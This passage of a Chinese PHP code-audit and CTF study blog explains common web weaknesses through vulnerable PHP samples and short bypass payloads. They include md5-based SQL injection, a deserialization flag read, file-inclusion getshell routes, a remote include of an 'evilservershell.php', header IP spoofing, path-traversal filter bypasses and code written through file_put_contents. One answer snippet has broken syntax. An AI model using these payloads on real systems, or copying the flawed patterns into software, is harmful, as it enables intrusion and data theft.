字符十六进制数</span><br></pre></td></tr></table></figure></p>\n<p>当md5函数的第二个参数为True时，编码将以16进制返回，再转换为字符串。而字符串’ffifdyop’的md5加密结果为<code>&#39;or&#39;&lt;trash&gt;</code> 其中 trash为垃圾值，or一个非0值为真，也就绕过了检测。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 执行顺序:字符串：ffifdyop -&gt; md5()加密成276f722736c95d99e921722cf9ed621c-&gt;md5(,true)将16进制转成字符串`'or'&lt;trash&gt;`-&gt;sql执行`'or'&lt;trash&gt;`造成注入</span></span><br><span class=\"line\">$sql = <span class=\"string\">\"SELECT * FROM admin WHERE username = admin pass = '\"</span>.md5($password,<span class=\"keyword\">true</span>).<span class=\"string\">\"'\"</span>;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"switch没有break\"><a href=\"#switch没有break\" class=\"headerlink\" title=\"switch没有break\"></a>switch没有break</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#这里case 0 和 1 没有break,使得程序继续往下执行。</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'which'</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $which = $_GET[<span class=\"string\">'which'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ($which)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">require_once</span> $which.<span class=\"string\">'.php'</span>;</span><br><span class=\"line\">         <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> GWF_HTML::error(<span class=\"string\">'PHP-0817'</span>, <span class=\"string\">'Hacker NoNoNo!'</span>, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- index.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">require_once</span>(<span class=\"string\">'shield.php'</span>);</span><br><span class=\"line\">\t$x = <span class=\"keyword\">new</span> Shield();</span><br><span class=\"line\">\t<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'class'</span>]) &amp;&amp; $g = $_GET[<span class=\"string\">'class'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($g)) &#123;</span><br><span class=\"line\">\t\t$x = unserialize($g);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $x-&gt;readfile();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"showimg.php?img=c2hpZWxkLmpwZw==\"</span> width=<span class=\"string\">\"100%\"</span>/&gt;</span><br><span class=\"line\">&lt;!-- shield.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t<span class=\"comment\">//flag is in pctf.php</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shield</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename = <span class=\"string\">''</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span> -&gt; file = $filename;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readfile</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span>  </span><br><span class=\"line\">\t\t\t&amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>)==<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">return</span> @file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;!-- showimg.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$f = $_GET[<span class=\"string\">'img'</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($f)) &#123;</span><br><span class=\"line\">\t\t$f = base64_decode($f);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (stripos($f,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos($f,<span class=\"string\">'\\\\'</span>)===<span class=\"keyword\">FALSE</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//stripos — 查找字符串首次出现的位置（不区分大小写）</span></span><br><span class=\"line\">\t\t&amp;&amp; stripos($f,<span class=\"string\">'pctf'</span>)===<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">\t\t\treadfile($f);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">echo</span> <span class=\"string\">\"File not found!\"</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#?class=O:6:\"Shield\":1:&#123;s:4:\"file\";s:8:\"pctf.php\";&#125;</span></span><br><span class=\"line\">&lt;!-- answer.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">require_once</span>(<span class=\"string\">'shield.php'</span>);</span><br><span class=\"line\">$x = class Shield();</span><br><span class=\"line\">$g = serialize($x);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $g;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- shield.php --&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"comment\">//flag is in pctf.php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shield</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $file;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($filename = <span class=\"string\">'pctf.php'</span>)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span> -&gt; file = $filename;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">readfile</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"keyword\">$this</span>-&gt;file) &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'..'</span>)===<span class=\"keyword\">FALSE</span>  </span><br><span class=\"line\">            &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'/'</span>)===<span class=\"keyword\">FALSE</span> &amp;&amp; stripos(<span class=\"keyword\">$this</span>-&gt;file,<span class=\"string\">'\\\\'</span>)==<span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> @file_get_contents(<span class=\"keyword\">$this</span>-&gt;file);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>原理：</p>\n<p>include()/include_once()，require()/require_once()，中的变量可控</p>\n<p>利用过程：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传图片（含有php代码的图片） </span><br><span class=\"line\">读文件，读php文件 </span><br><span class=\"line\">包含日志文件getshell </span><br><span class=\"line\">包含/proc/self/envion文件getshell </span><br><span class=\"line\">如果有phpinfo可以包含临时文件 </span><br><span class=\"line\">包含data://或php://input等伪协议（需要allow_url_include=On)</span><br></pre></td></tr></table></figure></p>\n<p>封闭协议：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:// — 访问本地文件系统</span><br><span class=\"line\">http:// — 访问 HTTP(s) 网址</span><br><span class=\"line\">ftp:// — 访问 FTP(s) URLs</span><br><span class=\"line\">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class=\"line\">zlib:// — 压缩流</span><br><span class=\"line\">data:// — 数据（RFC 2397）</span><br><span class=\"line\">glob:// — 查找匹配的文件路径模式</span><br><span class=\"line\">phar:// — PHP 归档</span><br><span class=\"line\">ssh2:// — Secure Shell 2</span><br><span class=\"line\">rar:// — RAR</span><br><span class=\"line\">ogg:// — 音频流</span><br><span class=\"line\">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 访问共享目录</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> (<span class=\"string\">'\\evilservershell.php'</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"提交参数无过滤\"><a href=\"#提交参数无过滤\" class=\"headerlink\" title=\"提交参数无过滤\"></a>提交参数无过滤</h2><p>原理:过滤了GPC，但没有过滤其它部分。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">上传文件相关变量如<span class=\"variable\">$_FIle</span></span><br><span class=\"line\"><span class=\"variable\">$_GET</span>，<span class=\"variable\">$_POST</span>，<span class=\"variable\">$_Cookie</span>，<span class=\"variable\">$_SERVER</span>，<span class=\"variable\">$_ENV</span>，<span class=\"variable\">$_SESSION</span>，<span class=\"variable\">$_REQUEST</span></span><br><span class=\"line\">HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响</span><br><span class=\"line\"><span class=\"variable\">$_HTTP_COOKIE_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_ENV_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_GET_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_POST_FILES</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_POST_VARS</span></span><br><span class=\"line\"><span class=\"variable\">$_HTTP_SERVER_VARS</span></span><br></pre></td></tr></table></figure>\n<p>案例：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">foreach</span>($_COOKIE <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">unset</span>($$_key);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t!ereg(<span class=\"string\">\"^\\_[A-Z]+\"</span>,$_key) &amp;&amp; $$_key=$_POST[$_key];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">AS</span> $_key=&gt;$_value)&#123;</span><br><span class=\"line\">\t!ereg(<span class=\"string\">\"^\\_[A-Z]+\"</span>,$_key) &amp;&amp; $$_key=$_GET[$_key];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>通过表单来传值。<br><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">\"post\"</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://localhost/qibo/member/comment.php?job=ifcom\"</span> <span class=\"attr\">enctype</span>=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"cidDB\"</span>&gt;</span>  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"submit\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p>这里的gid为查询参数<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_SERVER                 <span class=\"comment\">//中用户能够控制的变量，php5.0后不受GPC影响</span></span><br><span class=\"line\">QUERY_STRING             <span class=\"comment\">//用户GET方法提交时的查询字符串</span></span><br><span class=\"line\">HTTP_REFERER             <span class=\"comment\">//用户请求的来源变量，在一些程序取得用户访问记录时用得比较多</span></span><br><span class=\"line\">HTTP_USER_AGENT          <span class=\"comment\">//用户的浏览器类型，也用于用户的访问记录的取得</span></span><br><span class=\"line\">HTTP_HOST                <span class=\"comment\">//提交的主机头等内容</span></span><br><span class=\"line\">HTTP_X_FORWARDED_FOR     <span class=\"comment\">//用户的代理主机的信息</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"伪造IP\"><a href=\"#伪造IP\" class=\"headerlink\" title=\"伪造IP\"></a>伪造IP</h2><p>原理:<br>以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">关键字：</span><br><span class=\"line\">HTTP_</span><br><span class=\"line\">getenv</span><br><span class=\"line\">$_SERVER</span><br><span class=\"line\">服务端：</span><br><span class=\"line\"><span class=\"keyword\">echo</span> getenv(<span class=\"string\">'HTTP_CLIENT_IP'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]; <span class=\"comment\">//访问端（有可能是用户，有可能是代理的）IP</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'HTTP_CLIENT_IP'</span>]; <span class=\"comment\">//代理端的（有可能存在，可伪造）</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>]; <span class=\"comment\">//用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span></span><br><span class=\"line\">客户端：</span><br><span class=\"line\">注意发送的格式：</span><br><span class=\"line\">CLIENT-IP:<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.1</span></span><br><span class=\"line\">X-FORWARDED-<span class=\"keyword\">FOR</span>:<span class=\"number\">10.10</span><span class=\"number\">.10</span><span class=\"number\">.10</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这个玩意恒成立的。不管有没有clientip</span><br><span class=\"line\">【strcasecmp(getenv(&apos;HTTP_CLIENT_IP&apos;), &apos;unknown&apos;)】</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过正则匹配\"><a href=\"#绕过正则匹配\" class=\"headerlink\" title=\"绕过正则匹配\"></a>绕过正则匹配</h2><h3 id=\"缺少-和-限定\"><a href=\"#缺少-和-限定\" class=\"headerlink\" title=\"缺少^和$限定\"></a>缺少^和$限定</h3><h3 id=\"数组绕过正则\"><a href=\"#数组绕过正则\" class=\"headerlink\" title=\"数组绕过正则\"></a>数组绕过正则</h3><p>【\\A[ _a-zA-Z0-9]+\\z】</p>\n<h3 id=\"str-replace路径穿越\"><a href=\"#str-replace路径穿越\" class=\"headerlink\" title=\"str_replace路径穿越\"></a>str_replace路径穿越</h3><p>原理<br>str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。</span></span><br><span class=\"line\"><span class=\"comment\">## 方法1</span></span><br><span class=\"line\"><span class=\"comment\">## 五个点加///</span></span><br><span class=\"line\"><span class=\"comment\">## 方法2</span></span><br><span class=\"line\"><span class=\"comment\">## ...././/</span></span><br><span class=\"line\">$dir = str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">'..\\\\'</span>, <span class=\"string\">'../'</span>, <span class=\"string\">'./'</span>, <span class=\"string\">'.\\\\'</span>), <span class=\"string\">''</span>, trim($dir),$countb);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $dir;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;/br&gt;替换数量'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $countb;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## 这里有对单独的.进行过滤，所以无法绕过。</span></span><br><span class=\"line\">$file = str_replace(<span class=\"keyword\">array</span>(<span class=\"string\">'../'</span>, <span class=\"string\">'\\\\'</span>, <span class=\"string\">'..'</span>), <span class=\"keyword\">array</span>(<span class=\"string\">''</span>, <span class=\"string\">'/'</span>, <span class=\"string\">''</span>), $_GET[<span class=\"string\">'file'</span>],$counta);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $file;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;/br&gt;替换数量'</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $counta;</span><br></pre></td></tr></table></figure>\n<h2 id=\"short-open-tag-on-短标签\"><a href=\"#short-open-tag-on-短标签\" class=\"headerlink\" title=\"short_open_tag=on 短标签\"></a>short_open_tag=on 短标签</h2><p>原理：<br>当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；<br>格式为：&lt;?xxxx;?&gt; –&gt; &lt;?xxx;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Go0s@ubuntu:~$ cat test.php</span><br><span class=\"line\">&lt;?=<span class=\"string\">\"helloworld\"</span>;</span><br><span class=\"line\">Go0s@ubuntu:~$ curl 127.0.0.1/test.php</span><br><span class=\"line\">helloworld</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"file-put-contents第二个参数传入数组\"><a href=\"#file-put-contents第二个参数传入数组\" class=\"headerlink\" title=\"file_put_contents第二个参数传入数组\"></a>file_put_contents第二个参数传入数组</h2><p>原理：<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_put_contents(file,data,mode,context)</span><br><span class=\"line\">file\t必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span><br><span class=\"line\">data\t可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">## ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();</span></span><br><span class=\"line\"><span class=\"comment\">## 这个要从burp去传，因为后面的【?】会被理解为参数而截断</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$a = $_GET[<span class=\"string\">'data'</span>];</span><br><span class=\"line\">$file = $_GET[<span class=\"string\">'filename'</span>];</span><br><span class=\"line\">$current = file_get_contents($file);</span><br><span class=\"line\">file_put_contents($file, $a);</span><br></pre></td></tr></table></figure>\n<h2 id=\"单引号和双引号\"><a href=\"#单引号和双引号\" class=\"headerlink\" title=\"单引号和双引号\"></a>单引号和双引号</h2><p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1</span></span><br><span class=\"line\">$s = <span class=\"string\">\"I am a 'single quote string' inside a double quote string\"</span>; </span><br><span class=\"line\">$s = <span class=\"string\">'I am a \"double quote string\" inside a single quote string'</span>; </span><br><span class=\"line\">$s = <span class=\"string\">\"I am a 'single quote string' inside a double quote string\"</span>; </span><br><span class=\"line\">$s = <span class=\"string\">'I am a \"double quote string\" inside a single quote string'</span>;</span><br><span class=\"line\"><span class=\"comment\"># 2</span></span><br><span class=\"line\">$abc=<span class=\"string\">'I love u'</span>; </span><br><span class=\"line\"><span class=\"keyword\">echo</span> $abc <span class=\"comment\">//结果是:I love u </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'$abc'</span> <span class=\"comment\">//结果是:$abc </span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"$abc\"</span> <span class=\"comment\">//结果是:I love u </span></span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br><span class=\"line\">$a=<span class=\"string\">\"$&#123;@phpinfo()&#125;\"</span>; <span class=\"comment\">//可以解析出来</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> $a=<span class=\"string\">\"$&#123;@phpinfo()&#125;\"</span>;<span class=\"meta\">?&gt;</span> <span class=\"comment\">//@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"查询语句缺少单引号\"><a href=\"#查询语句缺少单引号\" class=\"headerlink\" title=\"查询语句缺少单引号\"></a>查询语句缺少单引号</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"Select * from table where id=$id\"</span> <span class=\"comment\"># 有注入</span></span><br><span class=\"line\"><span class=\"string\">\"Select * from table where id=\"</span>.$id.<span class=\"string\">\" limit 1\"</span> <span class=\"comment\"># 有注入</span></span><br><span 